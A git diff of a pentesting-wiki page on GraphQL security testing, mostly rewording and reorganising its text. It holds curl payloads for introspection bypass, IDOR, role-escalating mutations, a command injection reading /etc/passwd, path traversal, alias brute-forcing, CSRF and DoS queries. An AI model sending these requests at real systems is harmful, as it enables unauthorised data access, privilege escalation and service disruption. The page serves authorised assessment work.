@@ -5,11 +5,11 @@ category: web
 
 # GraphQL
 
+## Theory
+
 GraphQL provides a query language and runtime for APIs, allowing clients to request exactly the data they need through a single endpoint. Unlike REST APIs, GraphQL enables flexible data fetching through schemas, queries, mutations, and resolvers.
 
 During web assessments, GraphQL implementations frequently expose schema information through introspection, authorization flaws (BOLA/IDOR), input handling issues, and DoS vectors.
-
-## Theory
 
 ### How GraphQL works
 
@@ -33,25 +33,25 @@ GraphQL operates through:
 
 ### Finding GraphQL endpoints
 
-GraphQL endpoints are commonly found at predictable paths. Test these locations:
+GraphQL endpoints are commonly found at predictable paths:
 
 - `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`
 - `/api`, `/graphql/api`
 
 #### Universal queries
 
-Send `{"query":"query{__typename}"}` to any suspected endpoint. GraphQL services will respond with `{"data": {"__typename": "Query"}}`.
+The query `{"query":"query{__typename}"}` can be sent to any suspected endpoint. GraphQL services will respond with `{"data": {"__typename": "Query"}}`.
 
 #### Request methods
 
-Test different HTTP methods and content-types:
+Different HTTP methods and content-types should be tested:
 
 ::: tabs
 
-=== Burp
+=== Burp Suite
 
-**POST with JSON (recommended):**
-```
+**POST with JSON:**
+```http
 POST /graphql HTTP/1.1
 Host: $TARGET
 Content-Type: application/json
@@ -60,13 +60,13 @@ Content-Type: application/json
 ```
 
 **GET with query parameter:**
-```
+```http
 GET /graphql?query=query{__typename} HTTP/1.1
 Host: $TARGET
 ```
 
 **POST with form data:**
-```
+```http
 POST /graphql HTTP/1.1
 Host: $TARGET
 Content-Type: application/x-www-form-urlencoded
@@ -74,7 +74,7 @@ Content-Type: application/x-www-form-urlencoded
 query=query{__typename}
 ```
 
-=== CLI
+=== curl
 
 ```bash
 # POST with JSON
@@ -93,13 +93,13 @@ curl -sS "http://$TARGET/graphql" \
 :::
 
 > [!NOTE]
-> GraphQL services often respond to invalid requests with "query not present" or similar errors.
+> GraphQL services often respond to invalid requests with "query not present" or similar errors, which can help confirm the endpoint.
 
 ### Schema mapping
 
 #### Introspection
 
-When introspection is enabled, query the schema to understand available operations:
+When introspection is enabled, the schema can be queried to understand available operations.
 
 **Basic schema query:**
 ```bash
@@ -109,13 +109,14 @@ curl -sS "http://$TARGET/graphql" \
 ```
 
 **Full introspection query:**
-Use the standard GraphQL introspection query from [this gist](https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da) or generate it with GraphQL libraries.
+
+The standard GraphQL introspection query can be generated with GraphQL libraries or found in the [official documentation](https://graphql.org/learn/introspection/).
 
 #### When introspection is disabled
 
-Attempt bypass techniques:
+Several bypass techniques can be attempted:
 
-**Insert special characters:**
+**Special character insertion:**
 ```bash
 # Newline after __schema
 curl -sS "http://$TARGET/graphql" \
@@ -128,7 +129,7 @@ curl -sS "http://$TARGET/graphql" \
   -d '{"query":"query{__schema {queryType{name}}}"}'
 ```
 
-**Test alternative methods:**
+**Alternative methods:**
 ```bash
 # GET request
 curl "http://$TARGET/graphql?query=query{__schema{queryType{name}}}"
@@ -145,21 +146,28 @@ curl -sS "http://$TARGET/graphql" \
   -d '{"query":"{invalidField}"}'
 ```
 
+> [!TIP]
+> Error messages from invalid queries often leak type names and field names, enabling incremental schema reconstruction even without introspection.
+
 #### Automated tools
 
 ::: tabs
 
 === InQL (Burp)
 
-Install from Burp's BApp Store and run introspection on GraphQL requests.
+[InQL](https://github.com/doyensec/inql) can be installed from Burp's BApp Store to perform introspection on GraphQL requests.
 
 === GraphQLmap
+
+[GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) (Python) can be used for CLI-based GraphQL security testing.
 
 ```bash
 python3 graphqlmap.py -u "http://$TARGET/graphql" -i
 ```
 
 === GraphQL Cop
+
+[GraphQL Cop](https://github.com/dolevf/GraphQL-Cop) (Python) can be used to audit GraphQL endpoints for common security misconfigurations.
 
 ```bash
 python3 graphql-cop.py -t "http://$TARGET/graphql"
@@ -171,7 +179,7 @@ python3 graphql-cop.py -t "http://$TARGET/graphql"
 
 #### BOLA/IDOR on object access
 
-Test direct object access by manipulating IDs:
+Direct object access can be tested by manipulating IDs:
 
 ```bash
 # Basic IDOR test
@@ -179,12 +187,12 @@ curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{user(id:\"123\"){id name email}}"}'
 
-# Test with different user ID
+# Access with different user ID
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{user(id:\"456\"){id name email role}}"}'
 
-# Test admin access
+# Admin access attempt
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{user(id:\"1\"){id name email isAdmin}}"}'
@@ -192,15 +200,15 @@ curl -sS "http://$TARGET/graphql" \
 
 #### Over-fetching and hidden fields
 
-Request fields not shown in the UI:
+Fields not exposed in the UI can be requested directly:
 
 ```bash
-# Test for sensitive user fields
+# Sensitive user fields
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{user(id:\"123\"){id name email role isAdmin internalNotes permissions}}"}'
 
-# Test admin-only data access
+# Admin-only data access
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{users{edges{node{id name email role lastLogin apiKey}}}}"}'
@@ -208,15 +216,15 @@ curl -sS "http://$TARGET/graphql" \
 
 #### Mutations and authorization
 
-Test privilege escalation through mutations:
+Privilege escalation can be attempted through mutations:
 
 ```bash
-# Attempt to update another user's role
+# Update another user's role
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{updateUser(input:{id:\"456\", role:\"ADMIN\"}){user{id role}}}"}'
 
-# Test ownership transfer
+# Ownership transfer
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{transferOwnership(resourceId:\"789\", newOwnerId:\"123\"){success}}"}'
@@ -224,7 +232,7 @@ curl -sS "http://$TARGET/graphql" \
 
 #### Unsanitized arguments
 
-Test for injection vulnerabilities:
+Resolver inputs should be tested for injection vulnerabilities.
 
 **SQL/NoSQL injection:**
 ```bash
@@ -241,7 +249,6 @@ curl -sS "http://$TARGET/graphql" \
 
 **Command injection:**
 ```bash
-# Command injection in system operations
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{execute(cmd:\"ls; cat /etc/passwd\"){output}}"}'
@@ -262,7 +269,6 @@ curl -sS "http://$TARGET/graphql" \
 
 **Path traversal:**
 ```bash
-# Path traversal in file operations
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{uploadFile(path:\"../../../etc/passwd\"){success}}"}'
@@ -270,10 +276,10 @@ curl -sS "http://$TARGET/graphql" \
 
 #### Bypassing rate limiting with aliases
 
-Use aliases to send multiple operations in one request:
+Aliases allow sending multiple operations in a single request, which can bypass per-request rate limiting:
 
 ```bash
-# Brute force discount codes
+# Brute force discount codes via aliases
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"query{check1:checkDiscount(code:\"CODE1\"){valid} check2:checkDiscount(code:\"CODE2\"){valid} check3:checkDiscount(code:\"CODE3\"){valid}}"}'
@@ -281,13 +287,13 @@ curl -sS "http://$TARGET/graphql" \
 
 #### GraphQL CSRF
 
-Test for CSRF when endpoint accepts alternative content-types:
+CSRF is possible when the endpoint accepts alternative content-types without proper token validation:
 
 ```bash
-# Test GET-based CSRF
+# GET-based CSRF
 curl "http://$TARGET/graphql?query=mutation{changePassword(newPassword:\"hacked\"){success}}"
 
-# Test form-based CSRF
+# Form-based CSRF
 curl -sS "http://$TARGET/graphql" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "query=mutation{changePassword(newPassword:\"hacked\"){success}}"
@@ -295,7 +301,10 @@ curl -sS "http://$TARGET/graphql" \
 
 #### DoS primitives
 
-Exploit unbounded operations:
+Unbounded operations can be exploited for denial of service.
+
+> [!CAUTION]
+> DoS payloads should be carefully controlled to avoid overwhelming production backends.
 
 **Deep recursion:**
 ```bash
@@ -313,32 +322,22 @@ curl -sS "http://$TARGET/graphql" \
   -d '{"query":"query{users(first:1000000){edges{node{id name email}}}}"}'
 ```
 
-> [!CAUTION]
-> Control payloads to avoid overwhelming backends. Consider impact on production systems.
-
 ## Resources
 
-### Tools
-- [InQL](https://github.com/doyensec/inql) - Burp extension for schema mapping and query generation
-- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - CLI GraphQL security testing
-- [GraphQL Cop](https://github.com/dolevf/GraphQL-Cop) - GraphQL security auditing
-- [Graphw00f](https://github.com/dolevf/graphw00f) - GraphQL implementation fingerprinting
-- [Clairvoyance](https://github.com/nikitastupin/clairvoyance) - GraphQL schema discovery tool
+[InQL — Burp extension for schema mapping and query generation](https://github.com/doyensec/inql)
 
-### Payload collections
-- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) - Comprehensive GraphQL payload collection
+[GraphQLmap — CLI GraphQL security testing](https://github.com/swisskyrepo/GraphQLmap)
 
-### References
-- [OWASP GraphQL Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-API_Testing/01-Testing_GraphQL)
-- [PortSwigger GraphQL Academy](https://portswigger.net/web-security/graphql)
-- [Hacking GraphQL Endpoints - YesWeHack](https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints)
-- [GraphQL Introspection](https://graphql.org/learn/introspection/)
-- [Common GraphQL Security Vulnerabilities](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)
+[GraphQL Cop — GraphQL security auditing](https://github.com/dolevf/GraphQL-Cop)
 
+[Graphw00f — GraphQL implementation fingerprinting](https://github.com/dolevf/graphw00f)
 
-### Prevention
-- [Securing GraphQL APIs](https://graphql.org/learn/security/)
-- [GraphQL Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/cors/)
+[Clairvoyance — GraphQL schema discovery when introspection is disabled](https://github.com/nikitastupin/clairvoyance)
 
+[PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
 
+[OWASP GraphQL Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-API_Testing/01-Testing_GraphQL)
 
+[PortSwigger GraphQL Academy](https://portswigger.net/web-security/graphql)
+
+[GraphQL Introspection — Official documentation](https://graphql.org/learn/introspection/)
